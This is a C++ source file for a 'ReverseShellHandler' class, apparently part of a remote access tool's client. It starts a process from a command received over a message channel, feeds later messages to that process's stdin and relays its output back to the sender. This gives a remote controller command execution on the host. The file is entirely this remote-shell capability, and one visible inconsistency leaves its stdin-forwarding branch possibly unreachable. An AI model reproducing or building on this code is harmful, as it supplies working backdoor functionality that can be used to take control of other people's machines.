#include "ReverseShellHandler.h"

#include "SingleProcessManager.h"
#include "StringExtensions.h"

ReverseShellHandler::ReverseShellHandler(
	const std::shared_ptr<IMessageSender> sender
) :
	_sender(sender),
	_manager(
		CreateSingleProcessManager(
			[&](const std::string& l) { ReadOutput(l); },
			true,
			true))
{
}

bool ReverseShellHandler::CanHandle(const MessageType type)
{
	return
		type == MessageType::StartReverseShell || 
		type == MessageType::StopReverseShell;
}

void ReverseShellHandler::Handle(const MessageType type, SharedSpan content)
{
	const auto command = content.toString();

	switch (type)
	{
		case MessageType::StartReverseShell:
			_manager->Run(ToWString(command));

			break;

		case MessageType::ReverseShellMessage:
			_manager->WriteToStdIn(command);

			break;

		case MessageType::StopReverseShell:
			_manager.reset();

			break;

		default:
			break;
	}
}

void ReverseShellHandler::ReadOutput(const std::string& line) const
{
	const auto content = SharedSpan(line);

	_sender->Send(MessageType::ReverseShellMessage, content);
}
